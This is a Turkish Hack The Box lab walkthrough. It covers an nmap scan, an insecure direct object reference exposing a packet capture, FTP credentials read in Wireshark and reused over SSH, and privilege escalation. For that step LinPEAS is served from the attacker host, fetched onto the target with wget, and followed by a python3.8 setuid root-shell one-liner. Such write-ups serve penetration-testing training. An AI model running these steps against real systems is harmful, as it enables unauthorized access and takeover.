## 0️⃣ Makineye Bağlanmak
Hackthebox'ta bir makineye bağlanmak için öncelikle openvpn dosyası indirip buna bağlantı sağlamalıyız.  
- 🌐 Connect to HTB butonuna bas  
- 🖥️ Machines ve ardından OpenVPN seç  
- 🌍 EU ve boş bir EU serverı seçtikten sonra TCP protokolünü seç ve dosyayı indir  
- 💻 Terminalden:  
```bash
openvpn <vpndosyasi>
```  
- Ardından CTF sayfasındaki "join machine" butonuna basarak hedef makineyi çalıştır ve hedef ip'yi al  
- ✅ Böylece siber saldırıya hazırız  

---

## 1️⃣ Pasif Bilgi Toplamak
```bash
nmap -Pn -sC -sV -O -T4 -e <interface> -oN scan.txt <target_ip>
```
- 📡 Öncelikle hedef ip'ye ping atılarak bağlantının sağlıklı olarak sağlanıp sağlanmadığı kontrol edilir  
- 🔧 -e interface kısmında interface olarak openvpn ile bağlantı sağlayan arayüz girilmelidir (ifconfig ile kontrol edilebilir)  
- 📊 Nmap sonuçları incelendiğinde 21(FTP),22(SSH) ve 80(HTTP) portlarının açık olduğu bilgisine ulaşılır  
- ✅ İlk görev tamamlanır  

---

## 2️⃣ Aktif Bilgi Toplamak
- 🌐 80 yani HTTP portunun açık olması bu web sitesini ziyaret edebileceğimiz anlamına gelir. Tarayıcıya `HTTP://<hedef_ip>` yazılarak siteye ulaşılır  
- 🔎 2.görevde "security snapshot" ipucusu belirtiliyor. Web sitesinde ilgili sekmeye gidilir ve ikinci görevde istenen bilgi edinilir  
- 🗂️ Linkte `/data/1` yazdığı görülür ve ilgili sitede bir kullanıcının web trafiğine dair paket bilgileri görülür  
- 🔄 Numara değiştirilmeye çalışılır ve `/data/0` yazıldığında yoğun web trafiği olan başka bir kullanıcıya ulaşılır  
- 💾 Web trafiği yoğun olan 0 kullanıcısının web trafiği "download" butonuna basılarak indirilir  

---

## 3️⃣ Analiz ve Hacklemek
- 📂 İnen dosyaya çift tıklanarak wireshark açılır ve paketler incelenir  
- 📝 FTP protokolü ile iletilen paketlerde kullanıcı adı ve şifrenin açıkça yazdığı görülür  
- 🔑 Makineye bağlanmak için ssh protokolüne ihtiyaç duyarız. FTP şifresi ile SSH şifresinin aynı olabileceği ihtimalini deneriz:  
```bash
ssh nathan@<hedef_ip>
password: <ele geçirilen ftp parolası>
```  
- ✅ Sisteme erişim başarıyla sağlanır  
- 📄 `ls` çalıştırılarak bir txt dosyası olduğu görülür, `cat <dosya>` ile okunarak user flag'i ele geçirilir  
- 🎯 5 ve 6.görevler tamamlanır ve ilk flag başarıyla elde edilir  

---

## 4️⃣ Yetki Yükseltmek
- 🛡️ Root flag'ini ele geçirmek için hedef makinede root olmalıyız ancak elimizde root şifresi yok  
- 🔍 Linpeas modülünü kendi bilgisayarımıza indir:  
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```  
- 🖥️ Dosyanın bulunduğu klasörde sunucu aç:  
```bash
python3 -m http.server 8000
```  
- 🏹 Hedef makinede linpeas’ı indir:  
```bash
wget http://<senin_ip>:8000/linpeas.sh
```  
- ⏹️ Sunucuyu kapat: `CTRL+C`  
- ⚡ LinPEAS çalıştır:  
```bash
sh linpeas.sh
```  
- 🟡 Raporu incele, anlamlı bulguları kontrol et → `/usr/bin/python3.8` yolunu bul  
- 💻 Exploit çalıştır:  
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```  
- 🔑 Root olduktan sonra root klasöründen txt dosyasını aç ve flagi al ✅  

---